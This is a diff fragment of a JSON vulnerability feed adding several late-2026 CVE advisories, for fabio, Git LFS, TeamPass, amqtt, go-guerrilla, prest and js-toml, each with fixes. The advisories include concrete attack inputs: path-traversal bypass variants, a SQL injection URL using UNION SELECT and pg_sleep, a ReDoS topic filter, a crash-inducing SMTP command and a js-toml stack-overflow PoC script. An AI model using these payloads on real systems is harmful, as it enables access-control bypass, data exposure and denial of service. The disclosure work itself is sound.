+        "https://github.com/poweradmin/poweradmin/commit/ce3ccace7e80f1c1424f1bb1d9ce63a33ee90f19"
+      ],
+      "vulnerableProducts": [
+        "poweradmin/poweradmin composer"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-104099",
+      "summary": "## Summary\n\nRoute selection uses the raw un-normalized request path, and the per-route ACL and basic-auth gates hang off that selection, so a dot-segment, encoded-dot, or double-slash variant of a protected path selects a different route, skips both gates, and is forwarded to the backend which normalizes and serves the protected resource. Unauthenticated; complete bypass of the access control the operator configured. Confirmed at HEAD b841544. Direct peers: Traefik CVE-2023-47106, Envoy CVE-2019-9901.\n\n## The defect\n\nfabio never normalizes the request path. A repository-wide search for path.Clean returns zero results. Route selection uses the raw path (route/table.go line 487: `if target = t.lookup(h, req.URL.Path, pick, match); target != nil {`). Both access-control gates are properties of the target that lookup returned:\n\n```go\n// proxy/http_proxy.go\nif t.AccessDeniedHTTP(r) {                      // line 111, per-route allow / deny:ip ACL\n    http.Error(w, \"access denied\", http.StatusForbidden)\n    return\n}\nif !t.Authorized(r, w, p.AuthSchemes) {          // line 116, per-route auth= basic auth\n    http.Error(w, \"authorization failed\", http.StatusUnauthorized)\n    return\n}\n```\n\nand the same raw path is forwarded verbatim (`Path: r.URL.Path` at line 142). So /./admin/, /%2e/admin/, //admin/ and /x/../admin/ do not match the protected /admin route. They fall through to the catch-all / route, which carries no ACL and no auth, and fabio forwards the un-normalized path to the origin, which normalizes it and serves the protected resource.\n\n## Verification\n\nVerified end to end against the real binary at HEAD, not a synthetic unit test. fabio was built and run with static routes against a `python3 -m http.server` origin, driven with curl --path-as-is: on a basic-auth route, /admin/ returned 401 without credentials and 200 with valid credentials (controls correct), while all four crafted paths returned 200 with the protected page and NO credentials; on an ACL route, /admin/ returned 403 and all four crafted variants returned 200.\n\nPrecondition, stated honestly: a less restrictive route must reach the same backend so the crafted path has somewhere to fall through to. That is exactly the two-tag urlprefix- shape fabio's own access-control documentation instructs operators to configure. Where no fallback route exists the request 404s instead.\n\n## Suggested fix\n\nNormalize the path before route lookup: decode percent-encoded dot segments and apply path.Clean, then match. Whether the normalized or original path is forwarded upstream is a separate decision, but the LOOKUP must run on the normalized form, because the ACL and auth decisions are derived from it. Also lowercase and strip the port and any trailing dot from the request host before host matching. Secondary observations: X-Forwarded-Prefix is passed through from the client on non-strip routes; the gRPC proxy path never calls either authorization gate, so allow=/auth= on a proto=grpc route are silently unenforced.\n\n## Dedup note\n\nThe obvious residual of CVE-2025-48865 is already taken: CVE-2026-62987 / GHSA-fq95-v8xc-jm3v (published 2026-07-03) covers the Connection-header strip of proxy.header.clientip/tls/requestid, fixed in v1.7.2. Do not re-report that. The finding above is a different and independent defect.\n\n## Tooling\n\nAI assistance was used while investigating. The bypass was reproduced against the real fabio binary with a live backend, including the 401-vs-200 and 403-vs-200 controls, and the reporter separately confirmed at HEAD that lookup takes req.URL.Path, that both gates derive from the returned target, that the raw path is forwarded, and that path.Clean appears nowhere in the repository.\n\nThe reporter manually verified this finding against the project's source at the location cited above before reporting it; the AI assistance noted above was for the audit and the drafting.",
+      "cvssScore": 9.1,
+      "severity": "Critical",
+      "published": "2026-11-20",
+      "modified": "2026-11-20",
+      "cwe": {
+        "cwe_id": "CWE-41",
+        "name": "Improper Resolution of Path Equivalence"
+      },
+      "references": [
+        "https://github.com/fabiolb/fabio/security/advisories/GHSA-4hrh-34w3-5ww8",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-104099",
+        "https://github.com/fabiolb/fabio/commit/f00ce1a446a4b7a3bccbefbb7bfe4a5e0e3fd817",
+        "https://github.com/fabiolb/fabio/releases/tag/v1.7.3",
+        "https://github.com/fabiolb/fabio/releases/tag/v1.8.0"
+      ],
+      "vulnerableProducts": [
+        "github.com/fabiolb/fabio go"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-69261",
+      "summary": "### Impact\n\nAfter receiving an HTTP redirection, Git LFS may forward certain HTTP headers to a host other than the one for which they were intended.  While `Authorization` headers are never forwarded to inappropriate hosts, `Cookie` headers may be forwarded incorrectly.\n\nGit LFS has resolved this issue by never forwarding `Cookie` headers to hosts other than the ones for which they were intended.  In particular, after an HTTP redirection is received to a URL with a different scheme, host, or port than found in the URL of the current request, any `Authorization` and `Cookie` headers from the current request will not be sent in the redirected request.\n\n### Patches\n\nThis problem exists in all versions since 0.5.0 and is patched in v3.8.1. All users should upgrade to v3.8.1.\n\n### Workarounds\n\nNo single workaround exists.  As far as possible, users and administrators should review their systems to confirm no unnecessary HTTP redirections are performed, and that HTTP headers other than `Authorization` do not contain privileged or confidential information.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* For general questions, start a discussion in the Git LFS [discussion forum](https://github.com/git-lfs/git-lfs/discussions).\n* For reports of additional vulnerabilities, please follow the Git LFS [security reporting policy](https://github.com/git-lfs/git-lfs/blob/main/SECURITY.md).",
+      "cvssScore": 7.6,
+      "severity": "High",
+      "published": "2026-11-20",
+      "modified": "2026-11-20",
+      "cwe": {
+        "cwe_id": "CWE-522",
+        "name": "Insufficiently Protected Credentials"
+      },
+      "references": [
+        "https://github.com/git-lfs/git-lfs/security/advisories/GHSA-x7xj-4j4f-88xr",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-69261",
+        "https://github.com/git-lfs/git-lfs/commit/12c92e05b3433494d4b8695943e7e230744d77d9",
+        "https://github.com/git-lfs/git-lfs/commit/256d371024e6d2cf19efe675d8b9ad089785d0a1",
+        "https://github.com/git-lfs/git-lfs/commit/537203a1fa08fdde4c16288fb039174ff0e692bb"
+      ],
+      "vulnerableProducts": [
+        "github.com/git-lfs/git-lfs go",
+        "github.com/git-lfs/git-lfs/v3 go"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-69260",
+      "summary": "### Impact\n\nWhen Git LFS makes object transfer or authentication requests to a remote host via SSH, it passes the path component of the remote's SSH URL as part of a command to be executed, but does not properly format the URL's path component as a single argument.  By inserting shell meta-characters into the SSH URL, an attacker may be able to execute arbitrary commands on the remote host, if the host passes the commands to a shell without sanitizing them first.\n\nGit LFS has resolved this problem by fully quoting the arguments of the remote commands it sends via SSH.\n\nAs well, Git LFS has resolved a problem with the default HTTPS URLs used when an SSH URL is configured for a remote host and the host either does not support Git LFS remote commands sent via SSH or supports HTTP authentication via SSH for Git LFS but does not return an explicit HTTP URL in response to a `git-lfs-authenticate` remote command.  In these cases, Git LFS now correctly encodes the HTTPS URL used to contact the remote host.\n\n### Patches\n\nThis problem exists in all versions since 0.5.0 and is patched in v3.8.1. All users should upgrade to v3.8.1.\n\n### Workarounds\n\nUsers may set the `lfs.sshTransfer` Git configuration option to `never`, after which Git LFS will not attempt any object transfers over SSH.  However, Git LFS will still make authentication requests to SSH URLs, so administrators of Git LFS services should ensure their systems sanitize all commands received over SSH before executing them.",
+      "cvssScore": 7.6,
+      "severity": "High",
+      "published": "2026-11-20",
+      "modified": "2026-11-20",
+      "cwe": {
+        "cwe_id": "CWE-78",
+        "name": "Improper Neutralization of Special Elements used in an OS Command"
+      },
+      "references": [
+        "https://github.com/git-lfs/git-lfs/security/advisories/GHSA-w3f2-pr6x-wwjc",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-69260",
+        "https://github.com/git-lfs/git-lfs/commit/091a95a796739bd0b8f59d8deeea79a452959508",
+        "https://github.com/git-lfs/git-lfs/commit/92d81117d465469a61dcb78546dd3d88806b25fd",
+        "https://github.com/git-lfs/git-lfs/commit/af5f4579ac1155734bb08f00ca92b9e89f8b51df"
+      ],
+      "vulnerableProducts": [
+        "github.com/git-lfs/git-lfs go",
+        "github.com/git-lfs/git-lfs/v3 go"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-103035",
+      "summary": "## Summary\n\nMissing authorization in the update_folder action: any authenticated non-read-only user can rename, re-parent and convert to personal any folder in the instance, moving another team's credential subtree into their own personal space and removing it from the organization. Confirmed at HEAD 2f271cdd (3.2.1.1), and present at 3.1.3.1 and 3.1.7.6.\n\n## The defect\n\nThe folder-management endpoint dispatches an update_folder action that renames and re-parents a folder. Unlike its sibling actions in the same file, it never checks the edited folder id or the submitted parent id against the caller's accessible-folder set, and the file itself performs no session/authorization gate at all. By pointing the new parent at their own personal folder, an authenticated low-privilege user takes ownership of any folder in the instance.\n\napp/sources/folders.queries.php:\n- The file never calls the session/authorization helpers: a grep for checkSession and userAccessPage across the whole file returns zero hits.\n- case 'update_folder' (lines 294-662) contains no reference to the caller's user-accessible_folders set. The only access-related logic is the personal-folder computation at lines 428-468 and the guard at line 503, which short-circuits on `(int) $isPersonal === 1`.\n- The sibling actions do carry the check: case 'add_folder' validates against user-accessible_folders at line 743, case 'delete_folders' at line 904, and case 'copy_folder' applies the equivalent parent check.\n\nSo update_folder is the one folder-mutating action in the file without an authorization predicate on either the target folder id or the new parent id.\n\n## Attacker model and trace\n\nAn authenticated TeamPass user who is not read-only (no administrative role required). The attacker submits update_folder with the victim folder's id and a parentId pointing at their own personal folder. Because the new parent is personal, the personal-folder computation sets $isPersonal = 1, which satisfies the line 503 guard, and the update writes the new parent and personal_folder = 1 for the target folder.\n\nConsequences: the stolen subtree is added to the attacker's accessible set on their next login, so the item list renders for them, and do_items_list_in_folder exposes the plaintext label, login, url, email and description of every credential in that subtree (item passwords stay sharekey-protected, hence C:L). Because the folder is now flagged personal, it disappears from the organization view for everyone else including administrators (the admin listing selects only personal_folder = 0), so this is also a denial of access to the real owners.\n\n## Verification\n\nSource-verified at HEAD: no session/authorization helper anywhere in the file; the update_folder case contains no accessible-folders predicate while add_folder, delete_folders and copy_folder do; the personal-folder short-circuit at line 503. A live TeamPass instance was not stood up.\n\nSecondary (needs a live confirmation before filing): there appears to be an unauthenticated variant. filter_input(INPUT_POST, 'key') returns null when omitted and $session->get('key') is null on a cookie-less session, so the null !== null comparison fails open; encryptClientServer is only set in public/index.php, so prepareExchangedData takes the plaintext-JSON branch. If that holds on a live instance this rises toward 9.4. The sibling actions fail closed on the anonymous path; only update_folder fails open. Please verify live, or report the authenticated variant alone (which stands on the source reading).\n\n## Suggested fix\n\nIn the update_folder case, verify that both the target folder id and the submitted parentId are members of the caller's user-accessible_folders set (mirroring add_folder and delete_folders) before applying the update, and reject a re-parent that would flip personal_folder for a folder the caller does not own. Adding the standard session/authorization gate to folders.queries.php as a whole is the more durable fix. Note items.queries.php has a second, identically named update_folder case that does perform the accessible-folders check, but that one can only edit title/complexity; the unguarded copy in folders.queries.php is the one the UI calls for re-parenting.\n\n## Tooling\n\nAI assistance was used while investigating, but it was confirmed at HEAD that folders.queries.php contains no checkSession/userAccessPage call, that the update_folder case (lines 294-662) contains no accessible-folders predicate while add_folder (line 743) and delete_folders (line 904) do, and that the personal-folder short-circuit sits at line 503.",
+      "cvssScore": 8.3,
+      "severity": "High",
+      "published": "2026-11-20",
+      "modified": "2026-11-20",
+      "cwe": {
+        "cwe_id": "CWE-639",
+        "name": "Authorization Bypass Through User-Controlled Key"
+      },
+      "references": [
+        "https://github.com/nilsteampassnet/TeamPass/security/advisories/GHSA-66q9-mxf2-xqw6",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-103035",
+        "https://github.com/nilsteampassnet/TeamPass/commit/e022b27f99149995c90a81f83b8e0ae8b48f5a20",
+        "https://github.com/nilsteampassnet/TeamPass/releases/tag/3.2.1.2",
+        "https://github.com/advisories/GHSA-66q9-mxf2-xqw6"
+      ],
+      "vulnerableProducts": [
+        "nilsteampassnet/TeamPass composer"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-104199",
+      "summary": "### Impact\n\n`amqtt` is vulnerable to a remote denial of service caused by improper MQTT topic-filter validation combined with catastrophic regular-expression backtracking.\n\nA single client can freeze the entire broker by sending one specially crafted `SUBSCRIBE` packet followed by one `PUBLISH` packet.\n\nThe vulnerability is caused by two defects:\n\n1. `add_subscription()` validates the placement of the single-level wildcard `+` using substring checks for `/+` and `+/`, rather than verifying that each `/`-delimited level containing `+` is exactly `+`. This allows malformed filters such as `\"+/\" + \"+\" * 60` to be accepted instead of rejected with return code `0x80`, as required by MQTT-4.7.1-3.\n2. `_matches()` converts every `+` character into the greedy regular-expression fragment `[^/]*` and evaluates the resulting expression with `re.fullmatch()`. A filter containing many adjacent `+` characters can cause catastrophic backtracking when matched against a topic that partially matches but ultimately fails.\n\nTopic matching runs synchronously inside the broker’s global broadcast loop. When the malicious match is evaluated, it blocks the asyncio event loop and prevents the broker from processing any other work.\n\nThe issue was reproduced using a single raw MQTT 3.1.1 TCP connection with no third-party client dependencies.\n\nSuccessful exploitation causes:\n\n- Existing message delivery to stop\n- New MQTT connections to receive no `CONNACK`\n- Keepalive processing to stop\n- Broadcast processing to stop\n- The broker to remain unavailable until the process is restarted\n\nUnder the default configuration, anonymous clients can exploit the vulnerability without credentials. When authentication is enabled, any authenticated client permitted to create arbitrary subscriptions and publish messages may still exploit it. Authentication alone is therefore not a sufficient mitigation.\n\n- Ecosystem: `pip`\n- Package: `amqtt`\n- Affected versions: `>= 0.11.0, <= 0.11.3`\n\nThe vulnerable code is present in the `v0.11.0` release commit, `352678c87e50e501a8a5bb91fab73c9400fa046c`, and remained present on the main branch as of `eeb1e254da9a1e8d9cc68ae754fcedac652e8fc0`. Versions before 0.11.0 were not evaluated.\n\nThis is a denial-of-service vulnerability only. `re.escape()` prevents arbitrary regular-expression injection, and there is no known path to remote code execution.\n\nNo confidentiality or integrity impact has been identified. Successful exploitation causes a complete loss of availability for the affected broker process.\n\n### Patches\n\nThe issue has been patched in the `v0.11.4` released version; all users should upgrade.\n\nThe completed fix:\n\n- Validate topic filters one level at a time\n- Require any level containing `+` to be exactly `+`\n- As part of comprehensive MQTT topic-filter validation, require `#` to occupy an entire level and appear only as the final level\n- Replace the regular-expression matcher with deterministic, level-by-level MQTT topic matching\n\nSimply changing the validation logic is not sufficient defense in depth if malformed filters can reach the existing regular-expression matcher through another code path.\n\n### Workarounds\n\nThis is the temporary mitigation that was recommended prior to the patched release: administrators can install a topic-filtering plugin that rejects malformed wildcard subscriptions before they are added to the broker. Place the plugin in an importable Python module, enable it in the broker configuration, and restart the broker.\n\n```python\nfrom amqtt.contexts import Action\nfrom amqtt.plugins.base import BaseTopicPlugin\nfrom amqtt.session import Session\n\nclass RejectInvalidTopicFilters(BaseTopicPlugin):\n    \"\"\"A plugin to prevent invalid wildcard subscriptions.\"\"\"\n    async def topic_filtering(\n        self, *, session: Session | None = None,\n        topic: str | None = None,\n        action: Action | None = None\n    ) -> bool | None:\n\n        if topic and action == Action.SUBSCRIBE:\n            levels = topic.split(\"/\")\n            return all(\n                level in {\"+\", \"#\"} or (\"+\" not in level and \"#\" not in level)\n                for level in levels\n            ) and \"#\" not in levels[:-1]\n        return True\n        \nconfig = {\n    ...\n    'plugins':{\n        ...\n        'myplugins.RejectInvalidTopicFilters': {}\n    }\n}\n``` \n\nThis workaround applies when subscription requests pass through the plugin. If the broker is configured to use a persistent session plugin, restarting the broker alone is not sufficient; any persisted sessions containing malformed topic filters need to be removed.\n\nRestarting the broker restores availability after exploitation, but the broker remains vulnerable until the patch or workaround is installed.\n\n### Acknowledgments\n\naMQTT thanks the following security researchers for their professional, coordinated private disclosure:\n\n* **Yongkang Xiao** (Wuhan University)\n* **Min Shi** (Wuhan University)\n* **Qiyi Deng** (Wuhan University)\n* **Jing Chen** (Wuhan University)",
+      "cvssScore": 8.7,
+      "severity": "High",
+      "published": "2026-11-20",
+      "modified": "2026-11-20",
+      "cwe": {
+        "cwe_id": "CWE-20",
+        "name": "Improper Input Validation"
+      },
+      "references": [
+        "https://github.com/Yakifo/amqtt/security/advisories/GHSA-2hjf-7455-w946",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-104199",
+        "https://github.com/Yakifo/amqtt/pull/361",
+        "https://github.com/Yakifo/amqtt/commit/e48a8a65027667f936d415db7f01d3ac350104e0",
+        "https://github.com/Yakifo/amqtt/releases/tag/v0.11.4"
+      ],
+      "vulnerableProducts": [
+        "amqtt pip"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-115578",
+      "summary": "The defect\n-------\nConfirmed at HEAD. server.go: cmdXCLIENT = []byte(\"XCLIENT\") is 7 bytes (line 78), so the dispatch match cmdXCLIENT.match(cmd) only guarantees len(input) >= 7. The handler then slices input[8:] (line 586):\n\n    case sc.XClientOn && cmdXCLIENT.match(cmd):\n        if toks := bytes.Split(input[8:], []byte{' '}); len(toks) > 0 {   // line 586\n\nA client sending the bare command XCLIENT (exactly 7 bytes) hits input[8:7] and panics runtime error: slice bounds out of range [8:7]. handleClient runs in the per-connection goroutine (server.go:391) which has no recover(); the only recover() calls are in the backend mail-processing workers (a different goroutine never reached during command parsing), so the unrecovered panic crashes the whole SMTP daemon.\n\nInput and attacker\n----------------\nConnect to the SMTP port, then send XCLIENT\\r\\n (a bare LF also works; no HELO needed). Precondition: xclient_on: true (off by default, but a documented nginx-fronted deployment; go-guerrilla does not restrict who may send XCLIENT). Attacker model: any unauthenticated client on the SMTP port.\n\nVerification level\n---------------\nEXECUTED with a negative control (agent-run, driving the real server.handleClient with XClientOn=true over the suite's mock net.Conn). The bare XCLIENT panics with the exact OOB; the negative control XCLIENT with a trailing space (8 bytes) does not panic and returns 250. The upstream TestXClient tests XCLIENT ADDR=... and XCLIENT c but never the bare 7-byte form (the missing regression case). I independently re-confirmed at HEAD that cmdXCLIENT is 7 bytes (server.go:78), that the handler slices input[8:] (server.go:586), and that handleClient (server.go:391) has no recover. NOT verified: did not stand up a standalone daemon on a real socket to observe OS-level process exit (used the mock net.Conn plus the traced absence of recover; crash-to-exit is standard Go runtime behavior).\n\nSuggested fix\n----------\nGuard the slice against the exact-verb-length case: require len(input) > len(cmdXCLIENT)+1 (or slice at the verb length and trim) before input[8:]. A recover in the per-connection handleClient loop would also contain any residual command-parse panic to the single connection.\n\nAlso checked and SOUND\n-------------------\nThe rfc5321 recursive-descent parser (MAIL/RCPT/HELO/EHLO/address) is bounds-safe (next()/peek() return 0 at EOF), and the line/size/recipient caps are enforced. XCLIENT is the only off-by-one; every other command arm slices exactly at its verb length.\n\nAdvisory-source note\n-----------------\nFive-source enumeration (repo advisories, OSV, NVD, the global GitHub DB, no vendor CNA) shows the PROXY-header IP-spoof bug (CVE-2025-31135, fixed v1.6.7) is the only published advisory; this XCLIENT panic is undisclosed and not contested.\n\nDedup\n--\nDedup gate clean: no phires/go-guerrilla blocking verdict in COVERED-INDEX, DISCLOSURE-INDEX or SCOUT-EXCLUDE.\n\nTooling\n----\nAI assistance was used while investigating. The panic is executed-verified with a negative control (a bare XCLIENT crashes the real handleClient while XCLIENT with a trailing space returns 250), and the reporter confirmed at HEAD that cmdXCLIENT is 7 bytes while the handler slices input[8:] on a per-connection goroutine with no recover.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2026-11-20",
+      "modified": "2026-11-20",
+      "cwe": {
+        "cwe_id": "CWE-129",
+        "name": "Improper Validation of Array Index"
+      },
+      "references": [
+        "https://github.com/phires/go-guerrilla/security/advisories/GHSA-hghq-53p7-c582",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-115578",
+        "https://github.com/phires/go-guerrilla/commit/b6deed97ff70f52bf34c386d33967694e7330d33",
+        "https://github.com/phires/go-guerrilla/commit/f0d0f2c40dcacf212e3a6a055ae67f7b412affc4",
+        "https://github.com/phires/go-guerrilla/releases/tag/v1.6.7-1"
+      ],
+      "vulnerableProducts": [
+        "github.com/phires/go-guerrilla go"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-104129",
+      "summary": "What the fix did and the gap\n-------------------------\nThe v2.3.0 fix (commit e88dabb) routed the _select field through a strict new gate, sanitizeSelectField (postgres.go:947/1003/2097). The sibling _groupby path was left on the far weaker isSafeSQLExpression. adapters/postgres/postgres.go, GroupByClause (line 1946): a _groupby field that contains balanced parens takes the raw-SQL-expression branch (around lines 1999-2006), gated only by isSafeSQLExpression (line 2001, defined at 2043). That gate validates only the OUTERMOST function name against a 13-entry allowlist and uses a character allowlist that permits spaces, single quotes and parens. It blocks ;, --, /* , unbalanced parens and an outer pg_ prefix, but NOT a trailing UNION SELECT ..., a nested (SELECT ...) subquery, or an inner pg_ function. sanitizeSelectField (the CVE fix) rejects exactly those.\n\nInput and attacker\n----------------\nGET /{database}/{schema}/{table}?_select=id&_groupby=upper((SELECT+1))+UNION+SELECT+current_user. Sink trace: controllers/crud.go:131 calls GroupByClause unconditionally, concatenates it into sqlSelect (crud.go:133), executed at crud.go:176 with only the WHERE values parameterized. Reached after only a table read-permission check, passable unauthenticated in the default config (the same pipeline and attacker model as the anchor).\n\nVerification level\n---------------\nEXECUTED with negative controls (agent-run go test ./adapters/postgres/, PASS): isSafeSQLExpression wrongly accepts four payloads and GroupByClause emits them raw (e.g. GROUP BY upper((SELECT 1)) UNION SELECT current_user, and GROUP BY abs((SELECT 1 FROM pg_sleep(3)))); negative controls with ; and -- are rejected; and sanitizeSelectField (the CVE fix) rejects the exact UNION payload the sibling gate accepts. I independently re-confirmed at HEAD that _groupby is gated by isSafeSQLExpression (postgres.go:2001) while _select uses sanitizeSelectField (postgres.go:947). NOT verified: end-to-end UNION exfiltration against a live Postgres (needs column/type alignment, Postgres-gated). The pg_sleep DoS primitive is unconditional and needs no alignment; char-by-char blind extraction is constrained (commas are pre-split, and =/</> are blocked).\n\nSuggested fix\n----------\nRoute _groupby through the same strict gate as _select (sanitizeSelectField-style: reject nested subqueries, UNION, inner pg_ functions, and anything past a single allowlisted function call), or parameterize/whitelist the group-by columns.\n\nAlso checked and SOUND\n-------------------\nThe other builders (WhereByRequest, OrderByRequest, JoinByRequest, CountByRequest, the jsonb/tsquery paths, ->>having, ident.IsValid) are sound; only the _groupby non-having function branch is the weak sibling.\n\nAdvisory-source note\n-----------------\nFive-source enumeration: CVE-2025-58450 (GHSA-p46v-f2x8-qp98, \"Systemic SQL Injection\", GO-2025-3941) and the newer GHSA-qvx3-q8vx-9q3c (which covers _select, fixed v2.3.0). Neither mentions _groupby / GROUP BY. The systemic advisory's own \"nested queries can be performed\" note supports the incomplete-fix framing. Not contested.\n\nDedup\n--\nDedup gate clean: no prest/prest blocking verdict in COVERED-INDEX, DISCLOSURE-INDEX or SCOUT-EXCLUDE.\n\nTooling\n----\nAI assistance wsa used while investigating. The injection is executed-verified with negative controls (isSafeSQLExpression accepts four UNION/subquery/pg_sleep payloads that GroupByClause emits raw, while ;/-- are rejected and the _select gate rejects the same UNION payload), and I confirmed at HEAD that _groupby uses the weak isSafeSQLExpression while _select was hardened with sanitizeSelectField.",
+      "cvssScore": 8.1,
+      "severity": "High",
+      "published": "2026-11-20",
+      "modified": "2026-11-20",
+      "cwe": {
+        "cwe_id": "CWE-89",
+        "name": "Improper Neutralization of Special Elements used in an SQL Command"
+      },
+      "references": [
+        "https://github.com/prest/prest/security/advisories/GHSA-v9v2-98xq-627c",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-104129",
+        "https://github.com/prest/prest/pull/1014",
+        "https://github.com/prest/prest/commit/084348fa82701b098492fc520557ff290b7691e2",
+        "https://github.com/prest/prest/commit/73e4b2aea81e2dbd33942efcb1a313fe3b151a41"
+      ],
+      "vulnerableProducts": [
+        "github.com/prest/prest go",
+        "github.com/prest/prest/v2 go"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-63386",
+      "summary": "## Summary\n\n`load()` parses untrusted TOML using a recursive-descent parser (Chevrotain) and a\nrecursive tree-walking interpreter. Neither the parser nor the interpreter enforces a\nmaximum nesting / key depth. A small, attacker-controlled document with deep nesting\n(arrays, inline tables) or a long dotted key drives recursion past the V8 call-stack\nlimit, and `load()` throws an **uncaught `RangeError: Maximum call stack size exceeded`**.\n\nThis is a problem for two reasons:\n\n1. **Denial of Service.** A tiny payload (≈2 KB) reliably aborts parsing. In any\n   service that parses user-supplied TOML, an unhandled `RangeError` can crash the\n   worker/process (500 / restart loop).\n2. **Error-contract violation.** The library signals invalid input via\n   `SyntaxParseError` (see `src/load/exception.ts`; the entire test suite asserts\n   `SyntaxParseError`). Consumers that follow this contract —\n\n   ```js\n   try { load(input); }\n   catch (e) {\n     if (e instanceof SyntaxParseError) return badRequest();\n     throw e; // unexpected -> propagates\n   }\n   ```\n\n   — will **re-throw** the `RangeError` instead of treating the input as malformed,\n   turning malformed input into an unexpected fatal error.\n\n## Impact\n\n- Unauthenticated attacker who can supply a TOML string to an application using\n  `js-toml` can force `load()` to throw a non-`SyntaxParseError` error.\n- If the error is not caught by a generic handler, the Node.js process terminates\n  (availability impact).\n- Even when caught generically, the documented/expected error type contract is broken,\n  which can bypass input-validation branches that key off `SyntaxParseError`.\n\nNo confidentiality or integrity impact. The error is thrown synchronously and is\ncatchable, so a consumer that catches *all* exceptions is not crashed — this is why the\nseverity is assessed Low–Medium rather than High.\n\n## Affected code / root cause\n\nThere is no depth bound anywhere in the parse pipeline. Recursion occurs in (at least)\ntwo independent places:\n\n1. **Parser (recursive descent).** `src/load/parser.ts` — `array` / `inlineTable`\n   rules recurse through `value` for each nesting level.\n2. **Interpreter (tree walk).** `src/load/interpreter.ts` —\n   `assignValue`, `createTable`, `getOrCreateArray` recurse per dotted-key segment, and\n   `cleanInternalProperties` recurses per object depth.\n\nBecause there is no configurable or hard limit, the recursion depth is bounded only by\nthe V8 stack, and overflow surfaces as a raw `RangeError`.\n\n## Steps to reproduce (PoC)\n\nEnvironment used: Node.js v20, `js-toml@1.1.2`.\n\n```js\nimport { load, SyntaxParseError } from 'js-toml';\n\nfunction probe(label, toml) {\n  try {\n    load(toml);\n    console.log(`[OK]            ${label}`);\n  } catch (e) {\n    const expected = e instanceof SyntaxParseError;\n    console.log(`[${e.constructor.name}${expected ? '' : ' (UNEXPECTED)'}] ${label}: ${String(e.message).split('\\n')[0]}`);\n  }\n}\n\n// 1) Deeply nested arrays  (~2 KB payload)\nprobe('nested array depth 1000', 'x = ' + '['.repeat(1000) + ']'.repeat(1000));\n\n// 2) Deeply nested inline tables\nlet v = '1';\nfor (let i = 0; i < 1000; i++) v = `{ a = ${v} }`;\nprobe('nested inline table depth 1000', 'x = ' + v);\n\n// 3) Deep dotted key (interpreter recursion)\nconst key = Array.from({ length: 5000 }, (_, i) => 'a' + i).join('.');\nprobe('dotted key depth 5000', `${key} = 1`);\n```\n\n### Observed output\n\n```\n[RangeError (UNEXPECTED)] nested array depth 1000: Maximum call stack size exceeded\n[RangeError (UNEXPECTED)] nested inline table depth 1000: Maximum call stack size exceeded\n[RangeError (UNEXPECTED)] dotted key depth 5000: Maximum call stack size exceeded\n```\n\nEach case throws `RangeError`, **not** `SyntaxParseError`. Overflow occurs in single-digit\nmilliseconds, so it is not a CPU-exhaustion issue — it is an immediate, deterministic abort.\n\nNotes on thresholds (machine-dependent; exact numbers vary by stack size):\n- Nested arrays / inline tables overflow at roughly **depth ~1000** (parser recursion).\n- Dotted keys overflow at roughly **depth ~5000** (interpreter recursion); depth 1000 still succeeds.\n\n## Suggested remediation\n\nEnforce an explicit, documented maximum nesting/key depth and surface violations as\n`SyntaxParseError` (consistent with all other invalid-input handling). For example:\n\n- Track current depth in the parser/interpreter and throw `SyntaxParseError`\n  (e.g. `\"Maximum nesting depth exceeded\"`) once a configurable limit (e.g. 100–1000)\n  is reached, **before** the native stack overflows.\n- As a defensive backstop, wrap the top-level `load()` body so that a thrown\n  `RangeError` from stack exhaustion is converted into a `SyntaxParseError`, guaranteeing\n  the documented error contract holds for all malformed input.\n\nA configurable limit (with a safe default) is preferable so legitimate deep documents can\nopt into a higher bound.\n\n## Disclosure\n\nReported privately via GitHub Security Advisory. Happy to provide additional reproducers\nor test against a candidate patch.",
+      "cvssScore": 5.3,
+      "severity": "Medium",
+      "published": "2026-11-20",
+      "modified": "2026-11-20",
       "cwe": {
         "cwe_id": "CWE-400",
         "name": "Uncontrolled Resource Consumption"
       },
       "references": [
-        "https://github.com/danielklecha/SharpIppNext/security/advisories/GHSA-3h63-w8jq-rrf2",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-59975",
-        "https://github.com/danielklecha/SharpIppNext/commit/30e236e35f415d5172e178c75030cafd53d150fe",
-        "https://github.com/danielklecha/SharpIppNext/commit/fe161eb3d6d114aaf9b2f1e42dea55b097257281",
-        "https://github.com/danielklecha/SharpIppNext/releases/tag/v4.1.0"
+        "https://github.com/sunnyadn/js-toml/security/advisories/GHSA-3g82-77xr-68x5",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-63386",
+        "https://github.com/sunnyadn/js-toml/commit/4e10acf1f99ff3cb443c58b8f0a57664e41e87c6",
+        "https://github.com/sunnyadn/js-toml/releases/tag/v1.1.3",
+        "https://github.com/advisories/GHSA-3g82-77xr-68x5"
       ],
       "vulnerableProducts": [
-        "SharpIppNext nuget"
+        "js-toml npm"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-77283",
